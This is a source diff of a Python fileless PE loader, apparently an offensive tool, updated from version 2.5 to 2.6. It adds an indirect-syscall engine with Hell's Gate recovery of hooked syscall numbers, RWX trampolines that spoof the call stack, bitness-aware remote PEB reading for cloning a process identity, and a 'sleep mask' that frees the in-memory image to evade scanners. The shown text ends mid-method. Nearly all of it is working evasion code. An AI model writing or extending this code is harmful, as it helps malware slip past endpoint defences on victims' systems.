@@ -25,7 +25,7 @@ Native Loader Capabilities:
 - ELF: Section header parsing, dynamic linking, shared library loading, RELA/REL relocations
 - Memory management and cleanup
 
-Version: 2.5 (Identity Cloak - Live Process Clone)
+Version: 2.6 (CFG-Safe Gadgets + Module Stomping)
 """
 
 import os
@@ -46,7 +46,32 @@ import struct
 import ctypes
 import platform
 from typing import List, Tuple, Dict, Optional, Iterator
-from ctypes import wintypes
+# --- FIX 3: Platform guard (v2.3) ---
+_IS_WINDOWS = platform.system() == "Windows"
+
+if _IS_WINDOWS:
+    from ctypes import wintypes
+else:
+    # Stub: provides wintypes type names so Structure definitions parse on Linux.
+    # These classes are never instantiated on non-Windows platforms.
+    import types as _types
+    wintypes = _types.SimpleNamespace(
+        USHORT=ctypes.c_ushort,
+        ULONG=ctypes.c_ulong,
+        DWORD=ctypes.c_ulong,
+        LONG=ctypes.c_long,
+        BOOLEAN=ctypes.c_byte,
+        BYTE=ctypes.c_byte,
+        HANDLE=ctypes.c_void_p,
+        LPWSTR=ctypes.c_wchar_p,
+        LPVOID=ctypes.c_void_p,
+        BOOL=ctypes.c_int,
+        WCHAR=ctypes.c_wchar,
+    )
+    # WINFUNCTYPE doesn't exist on Linux; alias to CFUNCTYPE so that
+    # class-level and function-pointer type definitions parse without error.
+    # None of these code paths execute on Linux.
+    ctypes.WINFUNCTYPE = ctypes.CFUNCTYPE
 
 # ==============================================================================
 # Compression Layer
@@ -70,6 +95,15 @@ except ImportError:
         @staticmethod
         def decompress(data: bytes) -> bytes:
             return zlib.decompress(data)
+
+# ==============================================================================
+# Callback Pinning Registry  (FIX 2, v2.3)
+# ==============================================================================
+# ctypes callbacks wrapping Python functions MUST be prevented from garbage
+# collection for as long as native code may invoke them.  Any callback whose
+# address is written into a PE's IAT gets appended here; the list is only
+# cleared explicitly during cleanup.
+_pinned_callbacks: list = []
 
 # ==============================================================================
 # Constants
@@ -393,10 +427,27 @@ class StealthResolver:
                     
                     # Check for forwarder (RVA points within export section)
                     if export_rva <= func_rva < export_rva + export_size:
-                        # This is a forwarder - would need to resolve it
-                        # For now, skip forwarders
-                        logging.debug(f"StealthResolver: {proc_name} is a forwarder, skipping")
-                        return 0
+                        # Forwarder: RVA points to an ASCII string like
+                        # "ntdll.RtlExitUserThread" or "api-ms-win-...func"
+                        # Resolve by parsing the string and recursing. (FIX 9, v2.5)
+                        try:
+                            fwd_str = ctypes.string_at(base + func_rva).decode('ascii')
+                            dot = fwd_str.index('.')
+                            fwd_module = fwd_str[:dot]
+                            fwd_func = fwd_str[dot + 1:]
+                            # Normalise module name (add .dll if missing)
+                            if not fwd_module.lower().endswith('.dll'):
+                                fwd_module += '.dll'
+                            logging.debug(f"StealthResolver: {proc_name} -> {fwd_module}!{fwd_func}")
+                            # Check for ordinal forward (e.g. "#123")
+                            if fwd_func.startswith('#'):
+                                # Ordinal forwarder — not common, skip for safety
+                                logging.debug(f"StealthResolver: Ordinal forwarder, skipping")
+                                return 0
+                            return self.get_proc_address(fwd_module, fwd_func)
+                        except Exception as e:
+                            logging.debug(f"StealthResolver: Forwarder resolution failed: {e}")
+                            return 0
                     
                     return base + func_rva
             
@@ -446,6 +497,462 @@ def get_stealth_resolver() -> StealthResolver:
     if _stealth_resolver is None:
         _stealth_resolver = StealthResolver()
     return _stealth_resolver
+
+# ==============================================================================
+# Indirect Syscall Engine + Call Stack Spoofing
+# ==============================================================================
+#
+# SyscallEngine: Extracts SSNs from ntdll stubs, locates syscall;ret gadgets
+# in ntdll's .text section, and builds two-stage trampolines that:
+#   1. Execute syscall from within ntdll's address space (indirect syscall)
+#   2. Spoof the RBP frame chain to show kernel32 -> ntdll ancestry
+#
+# Hell's Gate: If a stub is hooked (first bytes overwritten), infers the SSN
+# from clean neighboring stubs (SSNs are sequential by address in ntdll).
+#
+# Trampoline (x64):
+#   Stage 1: save rbp/r12 -> spoof rbp -> [rsp]=stage2 -> mov r10,rcx;
+#            mov eax,SSN -> jmp ntdll_gadget
+#   Stage 2: restore rbp -> push r12 (real return) -> restore r12 -> ret
+#   Data:    saved_rbp | saved_r12 | fake_frame_0 | fake_frame_1
+#
+# NOT thread-safe per-function (fixed data area for register saves).
+# ==============================================================================
+
+class SyscallEngine:
+    _instance = None
+
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance._initialized = False
+        return cls._instance
+
+    def __init__(self):
+        if self._initialized:
+            return
+        self._initialized = True
+        self._ssn_cache = {}
+        self._gadget_addr = 0
+        self._func_gadgets = {}   # FIX 11: per-function syscall gadget addresses
+        self._trampolines = {}
+        self._trampoline_allocs = []
+        self._spoof_targets = {}
+        self._VirtualAlloc = None
+        self._VirtualFree = None
+        self._available = False
+        try:
+            self._init_engine()
+            self._available = True
+        except Exception as e:
+            logging.warning(f"SyscallEngine: Init failed ({e}) - falling back to standard calls")
+
+    @property
+    def available(self):
+        return self._available
+
+    def _init_engine(self):
+        resolver = get_stealth_resolver()
+        ntdll_base = resolver.get_module_base("ntdll.dll")
+        if not ntdll_base:
+            raise RuntimeError("ntdll.dll not found in PEB")
+
+        va_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+        vf_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
+        if not va_addr:
+            raise RuntimeError("Cannot resolve VirtualAlloc for trampoline allocation")
+        self._VirtualAlloc = ctypes.WINFUNCTYPE(
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
+            ctypes.c_ulong, ctypes.c_ulong
+        )(va_addr)
+        if vf_addr:
+            self._VirtualFree = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
+            )(vf_addr)
+
+        self._gadget_addr = self._find_syscall_ret_gadget(ntdll_base)
+        if not self._gadget_addr:
+            raise RuntimeError("No clean syscall;ret gadget in ntdll")
+        self._extract_ssns(ntdll_base, resolver)
+        if not self._ssn_cache:
+            raise RuntimeError("Failed to extract any SSNs")
+        self._find_spoof_targets(resolver)
+
+        logging.info(
+            f"SyscallEngine: Ready — {len(self._ssn_cache)} SSNs, "
+            f"gadget @ 0x{self._gadget_addr:X}, "
+            f"spoof targets: {len(self._spoof_targets)}"
+        )
+
+    # --- Gadget Scanner ---
+
+    def _find_syscall_ret_gadget(self, ntdll_base: int) -> int:
+        pe_offset = struct.unpack('<I', ctypes.string_at(ntdll_base + 0x3C, 4))[0]
+        num_sections = struct.unpack('<H', ctypes.string_at(ntdll_base + pe_offset + 6, 2))[0]
+        opt_size = struct.unpack('<H', ctypes.string_at(ntdll_base + pe_offset + 20, 2))[0]
+        section_hdr = ntdll_base + pe_offset + 24 + opt_size
+
+        text_rva = text_vsize = 0
+        for i in range(num_sections):
+            off = section_hdr + i * 40
+            name = ctypes.string_at(off, 8).rstrip(b'\x00')
+            if name == b'.text':
+                text_vsize = struct.unpack('<I', ctypes.string_at(off + 8, 4))[0]
+                text_rva = struct.unpack('<I', ctypes.string_at(off + 12, 4))[0]
+                break
+        if not text_rva or not text_vsize:
+            return 0
+
+        scan_start = ntdll_base + text_rva
+        scan_end = scan_start + text_vsize - 2
+        CHUNK = 8192
+        current = scan_start
+        while current < scan_end:
+            chunk_len = min(CHUNK, scan_end - current + 3)
+            try:
+                chunk = ctypes.string_at(current, chunk_len)
+            except OSError:
+                current += CHUNK - 2
+                continue
+            for j in range(len(chunk) - 2):
+                if chunk[j] == 0x0F and chunk[j + 1] == 0x05 and chunk[j + 2] == 0xC3:
+                    gadget = current + j
+                    logging.info(f"SyscallEngine: syscall;ret gadget @ 0x{gadget:X}")
+                    return gadget
+            current += CHUNK - 2
+        return 0
+
+    # --- SSN Extraction + Hell's Gate Recovery ---
+
+    _TARGET_FUNCTIONS = [
+        "NtAllocateVirtualMemory", "NtProtectVirtualMemory",
+        "NtFreeVirtualMemory", "NtCreateThreadEx",
+        "NtWaitForSingleObject", "NtQueryInformationProcess",
+        "NtClose", "NtWriteVirtualMemory", "NtReadVirtualMemory",
+    ]
+    _NEIGHBOR_FUNCTIONS = _TARGET_FUNCTIONS + [
+        "NtOpenProcess", "NtCreateFile", "NtOpenFile",
+        "NtQuerySystemInformation", "NtCreateSection",
+        "NtMapViewOfSection", "NtUnmapViewOfSection",
+        "NtSetInformationThread", "NtQueryVirtualMemory",
+        "NtResumeThread", "NtSuspendThread",
+        "NtGetContextThread", "NtSetContextThread", "NtDelayExecution",
+    ]
+
+    def _extract_ssns(self, ntdll_base, resolver):
+        for func_name in self._TARGET_FUNCTIONS:
+            addr = resolver.get_proc_address("ntdll.dll", func_name)
+            if not addr:
+                continue
+            ssn = self._read_ssn_from_stub(addr)
+            if ssn is None:
+                logging.debug(f"SyscallEngine: {func_name} appears hooked, trying Hell's Gate")
+                ssn = self._hells_gate_recover(ntdll_base, resolver, func_name, addr)
+            if ssn is not None:
+                self._ssn_cache[func_name] = ssn
+                # FIX 11: Record per-function syscall gadget for CFG safety.
+                # If the stub is clean, its own syscall instruction at +8 is the
+                # safest gadget (within the function's own code range → CFG-valid).
+                # If hooked, _hells_gate_recover stores the clean neighbor's gadget.
+                if func_name not in self._func_gadgets:
+                    gadget = self._find_stub_syscall(addr)
+                    if gadget:
+                        self._func_gadgets[func_name] = gadget
+                logging.debug(f"SyscallEngine: {func_name} SSN = 0x{ssn:04X}"
+                              f" gadget @ 0x{self._func_gadgets.get(func_name, 0):X}")
+            else:
+                logging.warning(f"SyscallEngine: No SSN for {func_name}")
+
+    def _find_stub_syscall(self, func_addr: int) -> int:
+        """Find the syscall;ret gadget within an ntdll stub (FIX 11).
+
+        Scans the first 32 bytes of the stub for the 0F 05 C3 (syscall; ret)
+        pattern.  Different Windows builds place syscall at different offsets:
+
+          Standard (≤1809):     offset +8   (4C8BD1 B8xxxx0000 0F05 C3)
+          Instrumented (1903+): offset +18  (4C8BD1 B8xxxx0000 F60425...01 7503 0F05 C3)
+
+        Returns the address of the syscall instruction, or 0 if not found.
+        """
+        try:
+            stub_bytes = ctypes.string_at(func_addr, 32)
+            for i in range(len(stub_bytes) - 2):
+                if stub_bytes[i] == 0x0F and stub_bytes[i+1] == 0x05 and stub_bytes[i+2] == 0xC3:
+                    return func_addr + i
+        except OSError:
+            pass
+        return 0
+
+    def _read_ssn_from_stub(self, func_addr):
+        try:
+            stub = ctypes.string_at(func_addr, 8)
+        except OSError:
+            return None
+        if stub[0:3] == b'\x4C\x8B\xD1' and stub[3] == 0xB8:
+            return struct.unpack('<I', stub[4:8])[0]
+        return None
+
+    def _hells_gate_recover(self, ntdll_base, resolver, target_name, target_addr):
+        nt_funcs = []
+        for name in self._NEIGHBOR_FUNCTIONS:
+            addr = resolver.get_proc_address("ntdll.dll", name)
+            if addr:
+                nt_funcs.append((name, addr))
+        if not nt_funcs:
+            return None
+        nt_funcs.sort(key=lambda x: x[1])
+        target_idx = next((i for i, (n, _) in enumerate(nt_funcs) if n == target_name), None)
+        if target_idx is None:
+            return None
+
+        for distance in range(1, min(8, len(nt_funcs))):
+            idx_below = target_idx - distance
+            if idx_below >= 0:
+                ssn = self._read_ssn_from_stub(nt_funcs[idx_below][1])
+                if ssn is not None:
+                    recovered = ssn + distance
+                    # FIX 11: Borrow the clean neighbor's syscall gadget
+                    neighbor_gadget = self._find_stub_syscall(nt_funcs[idx_below][1])
+                    if neighbor_gadget:
+                        self._func_gadgets[target_name] = neighbor_gadget
+                    logging.info(
+                        f"SyscallEngine: Hell's Gate recovered {target_name} "
+                        f"SSN=0x{recovered:04X} from {nt_funcs[idx_below][0]}"
+                    )
+                    return recovered
+            idx_above = target_idx + distance
+            if idx_above < len(nt_funcs):
+                ssn = self._read_ssn_from_stub(nt_funcs[idx_above][1])
+                if ssn is not None:
+                    recovered = ssn - distance
+                    if recovered >= 0:
+                        # FIX 11: Borrow the clean neighbor's syscall gadget
+                        neighbor_gadget = self._find_stub_syscall(nt_funcs[idx_above][1])
+                        if neighbor_gadget:
+                            self._func_gadgets[target_name] = neighbor_gadget
+                        logging.info(
+                            f"SyscallEngine: Hell's Gate recovered {target_name} "
+                            f"SSN=0x{recovered:04X} from {nt_funcs[idx_above][0]}"
+                        )
+                        return recovered
+        return None
+
+    # --- Spoof Targets (legitimate return addrs for fake RBP chain) ---
+
+    def _find_spoof_targets(self, resolver):
+        k32 = resolver.get_proc_address("kernel32.dll", "BaseThreadInitThunk")
+        if k32:
+            self._spoof_targets['kernel32_ret'] = k32 + 0x14
+        else:
+            fb = resolver.get_proc_address("kernel32.dll", "WaitForSingleObjectEx")
+            if fb:
+                self._spoof_targets['kernel32_ret'] = fb + 0x10
+
+        ntdll = resolver.get_proc_address("ntdll.dll", "RtlUserThreadStart")
+        if ntdll:
+            self._spoof_targets['ntdll_ret'] = ntdll + 0x21
+        else:
+            fb = resolver.get_proc_address("ntdll.dll", "LdrInitializeThunk")
+            if fb:
+                self._spoof_targets['ntdll_ret'] = fb + 0x10
+
+    # --- Two-Stage Trampoline Builder ---
+
+    def _build_trampoline(self, func_name):
+        ssn = self._ssn_cache.get(func_name)
+        if ssn is None:
+            return 0
+        # FIX 11: Prefer per-function gadget (within the function's own stub
+        # → CFG-valid).  Fall back to global gadget if no per-function available.
+        gadget_addr = self._func_gadgets.get(func_name, self._gadget_addr)
+        k32_ret = self._spoof_targets.get('kernel32_ret', 0)
+        ntdll_ret = self._spoof_targets.get('ntdll_ret', 0)
+
+        # Stage 1: 78 bytes — save state, spoof rbp, indirect syscall
+        s1 = bytearray()
+        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <saved_rbp>
+        s1 += b'\x48\x89\x28'                  # mov [rax], rbp
+        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <saved_r12>
+        s1 += b'\x4C\x89\x20'                  # mov [rax], r12
+        s1 += b'\x4C\x8B\x24\x24'              # mov r12, [rsp]
+        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <fake_frame_0>
+        s1 += b'\x48\x89\xC5'                  # mov rbp, rax
+        s1 += b'\x48\xB8' + b'\x00' * 8       # mov rax, <stage2>
+        s1 += b'\x48\x89\x04\x24'              # mov [rsp], rax
+        s1 += b'\x4C\x8B\xD1'                  # mov r10, rcx
+        s1 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <gadget>
+        s1 += b'\xB8' + struct.pack('<I', ssn) # mov eax, SSN
+        s1 += b'\x41\xFF\xE3'                  # jmp r11
+
+        # Stage 2: 29 bytes — restore state, return (FIX 8, v2.5)
+        # CRITICAL: Must NOT clobber rax — it holds the NTSTATUS return value
+        # from the syscall.  Original code used rax as scratch for data area
+        # loads, destroying the return value.  Use r11 instead (caller-saved,
+        # not part of the return value ABI).
+        s2 = bytearray()
+        s2 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <saved_rbp>
+        s2 += b'\x49\x8B\x2B'                  # mov rbp, [r11]
+        s2 += b'\x41\x54'                       # push r12
+        s2 += b'\x49\xBB' + b'\x00' * 8       # mov r11, <saved_r12>
+        s2 += b'\x4D\x8B\x23'                  # mov r12, [r11]
+        s2 += b'\xC3'                           # ret
+
+        s1_sz, s2_sz = len(s1), len(s2)
+
+        # Data: saved_rbp(8) + saved_r12(8) + frame0(16) + frame1(16) = 48
+        data = bytearray(16)  # saved_rbp + saved_r12
+        data += b'\x00' * 8 + struct.pack('<Q', k32_ret)       # frame0
+        data += struct.pack('<Q', 0) + struct.pack('<Q', ntdll_ret)  # frame1
+        total = s1_sz + s2_sz + len(data)
+
+        mem = self._VirtualAlloc(None, total, 0x3000, PAGE_EXECUTE_READWRITE)
+        if not mem:
+            return 0
+        base = mem if isinstance(mem, int) else ctypes.cast(mem, ctypes.c_void_p).value
+        self._trampoline_allocs.append(base)
+
+        s2_va = base + s1_sz
+        d_va = base + s1_sz + s2_sz
+        rbp_va, r12_va = d_va, d_va + 8
+        f0_va, f1_va = d_va + 16, d_va + 32
+
+        struct.pack_into('<Q', data, 16, f1_va)         # frame0.next -> frame1
+
+        struct.pack_into('<Q', s1, 0x02, rbp_va)        # saved_rbp addr
+        struct.pack_into('<Q', s1, 0x0F, r12_va)        # saved_r12 addr
+        struct.pack_into('<Q', s1, 0x20, f0_va)         # fake_frame_0 addr
+        struct.pack_into('<Q', s1, 0x2D, s2_va)         # stage2 addr
+        struct.pack_into('<Q', s1, 0x3E, gadget_addr)   # ntdll gadget addr
+
+        struct.pack_into('<Q', s2, 0x02, rbp_va)        # saved_rbp addr
+        struct.pack_into('<Q', s2, 0x11, r12_va)        # saved_r12 addr
+
+        ctypes.memmove(base, bytes(s1) + bytes(s2) + bytes(data), total)
+
+        # NOTE (FIX 7, v2.4): DO NOT downgrade to PAGE_EXECUTE_READ.
+        # The trampoline's data area (saved_rbp, saved_r12, fake RBP frames)
+        # lives at offset s1_sz+s2_sz within the same page as the code.
+        # Stage 1 writes to saved_rbp/saved_r12 at runtime via:
+        #   mov rax, <saved_rbp_addr>; mov [rax], rbp
+        # Marking the page RX causes an immediate access violation on the
+        # first syscall.  Code + data share a single page (~155 bytes total),
+        # so page-granularity protection can't split them.  RWX is required.
+
+        logging.debug(f"SyscallEngine: {func_name} SSN=0x{ssn:04X} trampoline @ 0x{base:X}")
+        return base
+
+    # --- Callable Factory ---
+
+    def get_syscall_func(self, func_name, restype, *argtypes):
+        if func_name not in self._trampolines:
+            addr = self._build_trampoline(func_name)
+            if not addr:
+                return None
+            self._trampolines[func_name] = addr
+        return ctypes.WINFUNCTYPE(restype, *argtypes)(self._trampolines[func_name])
+
+    # --- High-Level Wrappers ---
+
+    def nt_alloc(self, address, size, alloc_type, protect):
+        fn = self.get_syscall_func(
+            "NtAllocateVirtualMemory", ctypes.c_long,
+            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p,
+            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong, ctypes.c_ulong,
+        )
+        if not fn:
+            return 0
+        ba = ctypes.c_void_p(address)
+        rs = ctypes.c_size_t(size)
+        st = fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.c_void_p(0),
+                ctypes.byref(rs), ctypes.c_ulong(alloc_type), ctypes.c_ulong(protect))
+        if st < 0:
+            logging.debug(f"SyscallEngine: NtAllocateVirtualMemory: 0x{st & 0xFFFFFFFF:08X}")
+            return 0
+        return ba.value or 0
+
+    def nt_protect(self, address, size, new_protect):
+        fn = self.get_syscall_func(
+            "NtProtectVirtualMemory", ctypes.c_long,
+            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
+            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
+        )
+        if not fn:
+            return False, 0
+        ba = ctypes.c_void_p(address)
+        rs = ctypes.c_size_t(size)
+        old = ctypes.c_ulong(0)
+        st = fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.byref(rs),
+                ctypes.c_ulong(new_protect), ctypes.byref(old))
+        return (True, old.value) if st >= 0 else (False, 0)
+
+    def nt_free(self, address, size=0, free_type=0x8000):
+        fn = self.get_syscall_func(
+            "NtFreeVirtualMemory", ctypes.c_long,
+            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p),
+            ctypes.POINTER(ctypes.c_size_t), ctypes.c_ulong,
+        )
+        if not fn:
+            return False
+        ba = ctypes.c_void_p(address)
+        rs = ctypes.c_size_t(size)
+        return fn(ctypes.c_void_p(-1), ctypes.byref(ba), ctypes.byref(rs), ctypes.c_ulong(free_type)) >= 0
+
+    def nt_create_thread(self, start_address, parameter=None):
+        fn = self.get_syscall_func(
+            "NtCreateThreadEx", ctypes.c_long,
+            ctypes.POINTER(ctypes.c_void_p), ctypes.c_ulong, ctypes.c_void_p,
+            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
+        )
+        if not fn:
+            return 0
+        h = ctypes.c_void_p(0)
+        st = fn(ctypes.byref(h), ctypes.c_ulong(0x1FFFFF), ctypes.c_void_p(0),
+                ctypes.c_void_p(-1), ctypes.c_void_p(start_address),
+                ctypes.c_void_p(parameter or 0), ctypes.c_ulong(0),
+                ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0), ctypes.c_void_p(0))
+        return (h.value or 0) if st >= 0 else 0
+
+    def nt_wait(self, handle, timeout_ms=0xFFFFFFFF):
+        fn = self.get_syscall_func(
+            "NtWaitForSingleObject", ctypes.c_long,
+            ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p,
+        )
+        if not fn:
+            return -1
+        tp = ctypes.c_void_p(0) if timeout_ms == 0xFFFFFFFF else ctypes.byref(ctypes.c_longlong(-timeout_ms * 10000))
+        return fn(ctypes.c_void_p(handle), ctypes.c_int(0), tp)
+
+    def nt_close(self, handle):
+        fn = self.get_syscall_func("NtClose", ctypes.c_long, ctypes.c_void_p)
+        return fn(ctypes.c_void_p(handle)) >= 0 if fn else False
+
+    def cleanup(self):
+        if not self._trampoline_allocs:
+            return
+        freed = 0
+        if self._VirtualFree:
+            for addr in self._trampoline_allocs:
+                try:
+                    self._VirtualFree(addr, 0, 0x8000)
+                    freed += 1
+                except:
+                    pass
+        if freed:
+            logging.debug(f"SyscallEngine: Freed {freed} trampolines")
+        self._trampoline_allocs.clear()
+        self._trampolines.clear()
+
+
+_syscall_engine = None
+
+def get_syscall_engine():
+    global _syscall_engine
+    if _syscall_engine is None:
+        _syscall_engine = SyscallEngine()
+    return _syscall_engine
+
+
 
 class CRTInitializer:
     def __init__(self, base_addr, stream, is_64bit, load_config_rva=0, load_config_size=0, command_line=None):
@@ -618,13 +1125,30 @@ class _PROCESSENTRY32W(ctypes.Structure):
         ("szExeFile",           wintypes.WCHAR * 260),
     ]
 
-# Remote PEB reading offsets (x64)
-_PP_OFFSET_IN_PEB      = 0x20   # PEB -> ProcessParameters pointer
-_CMD_OFFSET_IN_PP      = 0x70   # ProcessParameters -> CommandLine
-_IMGPATH_OFFSET_IN_PP  = 0x60   # ProcessParameters -> ImagePathName
-_CURDIR_OFFSET_IN_PP   = 0x38   # ProcessParameters -> CurrentDirectory.DosPath
-_ENV_OFFSET_IN_PP      = 0x80   # ProcessParameters -> Environment pointer
-_US_SIZE               = 16     # sizeof(UNICODE_STRING) on x64
+# Remote PEB reading offsets — bitness-aware (FIX 5, v2.3)
+# Selected at module load based on pointer size of the current interpreter.
+# When cloning a remote process, the remote process's bitness must match
+# (cloning a WoW64 process from a 64-bit Python is not supported).
+_IS_64BIT_PROCESS = ctypes.sizeof(ctypes.c_void_p) == 8
+
+if _IS_64BIT_PROCESS:
+    _PP_OFFSET_IN_PEB      = 0x20   # PEB -> ProcessParameters pointer
+    _CMD_OFFSET_IN_PP      = 0x70   # ProcessParameters -> CommandLine
+    _IMGPATH_OFFSET_IN_PP  = 0x60   # ProcessParameters -> ImagePathName
+    _CURDIR_OFFSET_IN_PP   = 0x38   # ProcessParameters -> CurrentDirectory.DosPath
+    _ENV_OFFSET_IN_PP      = 0x80   # ProcessParameters -> Environment pointer
+    _US_SIZE               = 16     # sizeof(UNICODE_STRING) on x64
+    _PTR_FMT               = '<Q'   # struct format for pointer reads
+    _PTR_SIZE              = 8
+else:
+    _PP_OFFSET_IN_PEB      = 0x10   # PEB -> ProcessParameters pointer (x86)
+    _CMD_OFFSET_IN_PP      = 0x40   # ProcessParameters -> CommandLine (x86)
+    _IMGPATH_OFFSET_IN_PP  = 0x38   # ProcessParameters -> ImagePathName (x86)
+    _CURDIR_OFFSET_IN_PP   = 0x24   # ProcessParameters -> CurrentDirectory.DosPath (x86)
+    _ENV_OFFSET_IN_PP      = 0x48   # ProcessParameters -> Environment pointer (x86)
+    _US_SIZE               = 8      # sizeof(UNICODE_STRING) on x86: USHORT+USHORT+PTR
+    _PTR_FMT               = '<I'   # struct format for pointer reads
+    _PTR_SIZE              = 4
 
 # Access rights
 _PROCESS_QUERY_INFORMATION = 0x0400
@@ -742,20 +1266,24 @@ class IdentityCloak:
         return buf.raw[:bytes_read.value]
 
     def _read_remote_pointer(self, hProcess, address: int) -> int:
-        """Read a 64-bit pointer from remote process memory."""
-        data = self._read_remote_mem(hProcess, address, 8)
-        if len(data) < 8:
+        """Read a pointer from remote process memory (bitness-aware, FIX 5)."""
+        data = self._read_remote_mem(hProcess, address, _PTR_SIZE)
+        if len(data) < _PTR_SIZE:
             return 0
-        return struct.unpack('<Q', data)[0]
+        return struct.unpack(_PTR_FMT, data)[0]
 
     def _read_remote_unicode_string(self, hProcess, us_address: int) -> str:
-        """Read a UNICODE_STRING from a remote process."""
-        # UNICODE_STRING: USHORT Length, USHORT MaximumLength, 4-byte pad, PWSTR Buffer
+        """Read a UNICODE_STRING from a remote process (bitness-aware, FIX 5)."""
+        # UNICODE_STRING layout:
+        #   x64: USHORT Length, USHORT MaxLen, 4-byte pad, PWSTR Buffer (total 16)
+        #   x86: USHORT Length, USHORT MaxLen, PWSTR Buffer            (total 8)
         us_data = self._read_remote_mem(hProcess, us_address, _US_SIZE)
         if len(us_data) < _US_SIZE:
             return ""
         length = struct.unpack('<H', us_data[0:2])[0]      # byte length
-        buf_ptr = struct.unpack('<Q', us_data[8:16])[0]     # buffer pointer
+        # Buffer pointer starts at offset 8 (x64, after 4-byte pad) or 4 (x86, no pad)
+        buf_offset = 8 if _IS_64BIT_PROCESS else 4
+        buf_ptr = struct.unpack(_PTR_FMT, us_data[buf_offset:buf_offset + _PTR_SIZE])[0]
         if length == 0 or buf_ptr == 0:
             return ""
         raw = self._read_remote_mem(hProcess, buf_ptr, length)
@@ -1090,6 +1618,530 @@ class IdentityCloak:
 # Memory Substrate - Fileless Execution Framework
 # ==============================================================================
 
+# ==============================================================================
+# Annihilation Sleep Mask
+# ==============================================================================
+#
+# Instead of encrypting the PE image during sleep (leaving a high-entropy blob
+# that memory scanners flag), Veriduct's sleep mask *annihilates* the PE:
+#   1. Captures the live PE image (post-relocation, post-IAT)
+#   2. Shatters + entangles + chunks it via existing Veriduct primitives
+#   3. VirtualFree's the PE region — it no longer exists in memory
+#   4. Chunks live as Python bytearray objects in Python's managed heap,
+#      indistinguishable from any other application data
+#   5. Sleeps via NtDelayExecution (through indirect syscall + stack spoof)
+#   6. On wake: re-allocates PE at the same base, reconstructs from chunks,
+#      re-applies section protections, returns to PE code
+#
+# The PE's thread stack is a separate allocation and survives the free.
+# The return address on the stack points back into .text which is restored
+# before the callback returns — the PE resumes as if Sleep() returned normally.
+#
+# IAT Integration: Sleep/SleepEx are hooked during import resolution.
+# The hook is a ctypes WINFUNCTYPE callback that runs in the PE's thread
+# context, so no cross-thread coordination is needed.
+#
+# Requires: SyscallEngine (indirect syscalls) or falls back to standard APIs.
+# Uses: semantic_shatter, entangle_chunks, semantic_unshatter, disentangle_chunks
+# ==============================================================================
+
+class SleepMask:
+    """
+    Annihilation-based sleep masking for in-memory PE images.
+
+    Memory scanners find nothing because the PE literally does not exist
+    during sleep — not encrypted, not obfuscated, not present.
+    """
+
+    def __init__(self, pe_base: int, pe_size: int, sections: list,
+                 is_64bit: bool = True, ssm_null_rate: float = 0.01,
+                 entanglement_groups: int = 3, chunk_size: int = 4096):
+        """
+        Args:
+            pe_base:       Base address of the mapped PE image
+            pe_size:       Total size of the PE image (SizeOfImage)
+            sections:      List of dicts with 'addr', 'size', 'char' (from loader)
+            is_64bit:      PE bitness
+            ssm_null_rate: Null insertion rate for semantic shatter
+            entanglement_groups: XOR entanglement group size
+            chunk_size:    Chunk size for splitting the image
+        """
+        self.pe_base = pe_base
+        self.pe_size = pe_size
+        self.sections = sections  # For re-applying protections on wake
+        self.is_64bit = is_64bit
+        self.ssm_null_rate = ssm_null_rate
+        self.entanglement_groups = entanglement_groups
+        self.chunk_size = chunk_size
+
+        # State preserved across sleep cycles
+        self._scattered_chunks = None       # List[bytes] — shattered/entangled chunks
+        self._ssm_seeds = None              # List[bytes] — SSM seeds per chunk
+        self._ssm_inserts = None            # List[List[int]] — SSM insert positions
+        self._entanglement_info = None      # Dict — entanglement group metadata
+        self._masked = False
+        self._mask_count = 0
+
+        # Callback pointers (prevent GC while PE holds IAT reference)
+        self._sleep_callback = None
+        self._sleep_ex_callback = None
+
+        # API references
+        self._syscall_eng = None
+        self._VirtualAlloc = None
+        self._VirtualProtect = None
+        self._VirtualFree = None
+        self._NtDelayExecution = None
+
+        self._resolve_apis()
+        logging.info(f"SleepMask: Initialized for PE at 0x{pe_base:X} ({pe_size} bytes)")
+
+    def _resolve_apis(self):
+        """Resolve memory management APIs — prefer SyscallEngine, fallback to stealth."""
+        try:
+            self._syscall_eng = get_syscall_engine()
+            if not self._syscall_eng.available:
+                self._syscall_eng = None
+        except Exception:
+            self._syscall_eng = None
+
+        # Always resolve fallbacks (needed for operations without Nt equivalents)
+        resolver = get_stealth_resolver()
+
+        va = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
+        vp = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
+        vf = resolver.get_proc_address("kernel32.dll", "VirtualFree")
+
+        if va:
+            self._VirtualAlloc = ctypes.WINFUNCTYPE(
+                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
+                ctypes.c_ulong, ctypes.c_ulong
+            )(va)
+        if vp:
+            self._VirtualProtect = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
+                ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+            )(vp)
+        if vf:
+            self._VirtualFree = ctypes.WINFUNCTYPE(
+                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
+            )(vf)
+
+        # Resolve NtDelayExecution for the actual sleep
